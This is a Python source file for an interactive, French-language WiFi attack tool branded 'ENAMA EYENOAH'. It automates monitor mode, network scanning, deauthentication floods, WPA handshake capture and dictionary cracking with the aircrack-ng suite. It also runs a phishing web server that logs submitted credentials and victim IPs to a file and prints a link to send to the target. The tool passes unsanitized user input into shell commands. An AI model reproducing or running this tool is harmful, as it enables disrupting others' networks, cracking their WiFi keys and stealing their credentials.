#!/usr/bin/env python3
import os
import sys
import subprocess
import http.server
import socketserver
import threading
import time
import re
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align
from rich.text import Text

console = Console()
HANDSHAKE_DIR = "handshakes"
CAPTURED_LOG = "captured_credentials.txt"
PHISH_PORT = 8080
history = []
template_path = None

# === ASCII ART ===
def print_title():
    ascii_art = """
███████╗███╗   ██╗ █████╗ ███╗   ███╗ █████╗ 
██╔════╝████╗  ██║██╔══██╗████╗ ████║██╔══██╗
█████╗  ██╔██╗ ██║███████║██╔████╔██║███████║
██╔══╝  ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║
███████╗██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║
╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
"""
    panel = Panel(Align.center(Text(ascii_art, style="bold green") + Text("\nENAMA EYENOAH", style="bold green underline")), style="green", padding=(1, 4))
    console.print(panel)

# === SHELL COMMANDS ===
def run_cmd(cmd, capture=False):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
        return result.stdout if capture else None
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")

def check_root():
    if os.geteuid() != 0:
        console.print("[bold red]Ce script doit être lancé avec sudo ![/bold red]")
        sys.exit(1)

# === MODE MONITOR ===
def detect_wifi_interface():
    output = run_cmd("iw dev", capture=True)
    for line in output.splitlines():
        if line.strip().startswith("Interface"):
            return line.split()[1]
    return None

def start_monitor_mode(iface):
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")
    time.sleep(2)
    return iface + "mon" if iface + "mon" in run_cmd("iw dev", capture=True) else None

def stop_monitor_mode(mon_iface):
    run_cmd(f"airmon-ng stop {mon_iface}")
    run_cmd("service NetworkManager restart")

# === SCAN WIFI ===
def parse_scan_output(output):
    nets = []
    cells = output.split("Cell ")
    for cell in cells[1:]:
        ssid = re.search(r'ESSID:"([^"]*)"', cell)
        bssid = re.search(r"Address: ([0-9A-F:]{17})", cell)
        channel = re.search(r"Channel:(\d+)", cell)
        signal = re.search(r"Signal level=(-?\d+) dBm", cell)
        encryption = "Open"
        if "WPA2" in cell:
            encryption = "WPA2"
        elif "WPA" in cell:
            encryption = "WPA"
        nets.append({
            "SSID": ssid.group(1) if ssid else "Hidden",
            "BSSID": bssid.group(1) if bssid else "",
            "Channel": channel.group(1) if channel else "?",
            "Signal": int(signal.group(1)) if signal else -100,
            "Enc": encryption
        })
    return nets

def scan_wifi(monitor_iface):
    console.print("[cyan]Scan des réseaux WiFi...[/cyan]")
    output = run_cmd(f"iwlist {monitor_iface} scan", capture=True)
    return parse_scan_output(output)

def show_networks(nets):
    table = Table(title="Réseaux WiFi détectés", style="bold magenta")
    table.add_column("ID", justify="center")
    table.add_column("SSID", justify="left")
    table.add_column("BSSID", justify="center")
    table.add_column("Canal", justify="center")
    table.add_column("Signal", justify="center")
    table.add_column("Sécurité", justify="center")
    for i, n in enumerate(nets):
        color = "green" if n["Signal"] > -70 else "yellow" if n["Signal"] > -85 else "red"
        table.add_row(str(i+1), n["SSID"], n["BSSID"], n["Channel"], f"[{color}]{n['Signal']}[/]", n["Enc"])
    console.print(table)

# === SCAN CLIENTS & DEAUTH ===
def scan_clients(bssid, channel, monitor_iface):
    console.print(f"[cyan]Scan des clients connectés à {bssid}...[/cyan]")
    cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write clients_scan --output-format csv {monitor_iface}"
    run_cmd(f"timeout 10 {cmd}")
    clients = []
    if os.path.exists("clients_scan-01.csv"):
        with open("clients_scan-01.csv") as f:
            lines = f.readlines()
            start = False
            for line in lines:
                if start:
                    parts = [x.strip() for x in line.split(",")]
                    if len(parts) > 0 and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", parts[0]):
                        clients.append(parts[0])
                if "Station MAC" in line:
                    start = True
    return clients

def deauth_attack(target_mac, bssid, monitor_iface):
    console.print(f"[red]Déauth attaque sur {target_mac if target_mac else 'tous'}...[/red]")
    packets = 100
    with Progress(SpinnerColumn(), BarColumn(), TextColumn("{task.description}"), TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task("Envoi paquets...", total=packets)
        for i in range(packets):
            cmd = f"aireplay-ng --deauth 1 -a {bssid}"
            if target_mac:
                cmd += f" -c {target_mac}"
            cmd += f" {monitor_iface}"
            run_cmd(cmd)
            progress.update(task, advance=1)

# === HANDSHAKE CAPTURE ===
def capture_handshake(bssid, channel, monitor_iface):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    file_path = os.path.join(HANDSHAKE_DIR, f"handshake_{bssid.replace(':','_')}")
    console.print(f"[cyan]Capture handshake sur {bssid}...[/cyan]")
    run_cmd(f"airodump-ng --bssid {bssid} --channel {channel} --write {file_path} {monitor_iface}")
    console.print(f"[green]Handshake sauvegardé dans {file_path}-01.cap[/green]")

# === CRACK WPA ===
def crack_wpa(cap_file, wordlist):
    console.print(f"[cyan]Crack WPA avec dictionnaire {wordlist}...[/cyan]")
    cmd = f"aircrack-ng {cap_file} -w {wordlist}"
    run_cmd(cmd)

# === PHISHING SERVER ===
class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if template_path and os.path.exists(template_path):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open(template_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Template introuvable")

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        ip = self.client_address[0]
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"{now} | IP: {ip} | Data: {data}\n"
        with open(CAPTURED_LOG, "a") as f:
            f.write(log_line)
        console.print(f"[green]{log_line.strip()}[/green]")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Merci! Vos informations ont ete recues.")

def start_phishing_server():
    global template_path
    while True:
        template_path = Prompt.ask("[cyan]Chemin fichier HTML template[/cyan]")
        if template_path.endswith(".html") and os.path.exists(template_path):
            break
        else:
            console.print("[red]Erreur: Fournis un fichier HTML valide (.html)[/red]")
    ip = run_cmd("hostname -I", capture=True).strip().split()[0]
    console.print(f"[green]Template valide: {template_path}[/green]")
    console.print(f"[yellow]Lien à donner à la cible: http://{ip}:{PHISH_PORT}[/yellow]")
    with socketserver.TCPServer(("", PHISH_PORT), PhishHandler) as httpd:
        try:
            console.print("[cyan]Serveur phishing en cours... Ctrl+C pour stopper[/cyan]")
            httpd.serve_forever()
        except KeyboardInterrupt:
            console.print("\n[red]Serveur stoppé.[/red]")

# === HISTORIQUE ===
def show_history():
    if not history:
        console.print("[yellow]Aucune action enregistrée.[/yellow]")
        return
    table = Table(title="Historique des actions", style="bold blue")
    table.add_column("Heure", justify="center")
    table.add_column("Action", justify="left")
    for h in history:
        table.add_row(h[0], h[1])
    console.print(table)

# === MENU ===
def main():
    check_root()
    print_title()
    iface = detect_wifi_interface()
    if not iface:
        console.print("[red]Aucune interface WiFi détectée.[/red]")
        return
    monitor_iface = start_monitor_mode(iface)
    if not monitor_iface:
        console.print("[red]Impossible d'activer mode monitor.[/red]")
        return

    try:
        while True:
            console.print("\n[cyan]Menu Principal[/cyan]")
            table = Table()
            table.add_column("Option", justify="center")
            table.add_column("Action", justify="left")
            table.add_row("1", "Scanner réseaux WiFi")
            table.add_row("2", "Voir clients + Déauth")
            table.add_row("3", "Capture handshake WPA")
            table.add_row("4", "Lancer phishing (template .html)")
            table.add_row("5", "Crack WPA avec dictionnaire")
            table.add_row("6", "Voir historique")
            table.add_row("7", "Quitter")
            console.print(table)

            choice = IntPrompt.ask("Choix", choices=["1","2","3","4","5","6","7"])
            if choice == 1:
                nets = scan_wifi(monitor_iface)
                if nets:
                    show_networks(nets)
                    history.append((datetime.now().strftime("%H:%M:%S"), "Scan WiFi"))
                else:
                    console.print("[red]Aucun réseau trouvé.[/red]")
            elif choice == 2:
                bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
                channel = Prompt.ask("[cyan]Canal[/cyan]")
                clients = scan_clients(bssid, channel, monitor_iface)
                if clients:
                    console.print(f"[green]Clients trouvés: {', '.join(clients)}[/green]")
                    target = Prompt.ask("[cyan]MAC cible ou 'all'[/cyan]")
                    if target.lower() == "all":
                        target = None
                    deauth_attack(target, bssid, monitor_iface)
                else:
                    console.print("[yellow]Aucun client détecté.[/yellow]")
            elif choice == 3:
                bssid = Prompt.ask("[cyan]BSSID cible[/cyan]")
                channel = Prompt.ask("[cyan]Canal[/cyan]")
                capture_handshake(bssid, channel, monitor_iface)
            elif choice == 4:
                start_phishing_server()
            elif choice == 5:
                cap_file = Prompt.ask("[cyan]Chemin fichier .cap[/cyan]")
                wordlist = Prompt.ask("[cyan]Chemin wordlist[/cyan]")
                crack_wpa(cap_file, wordlist)
            elif choice == 6:
                show_history()
            elif choice == 7:
                console.print("[green]Arrêt et retour mode managed...[/green]")
                stop_monitor_mode(monitor_iface)
                break
    except KeyboardInterrupt:
        console.print("\n[red]Interruption détectée, nettoyage...[/red]")
        stop_monitor_mode(monitor_iface)

if __name__ == "__main__":
    main()
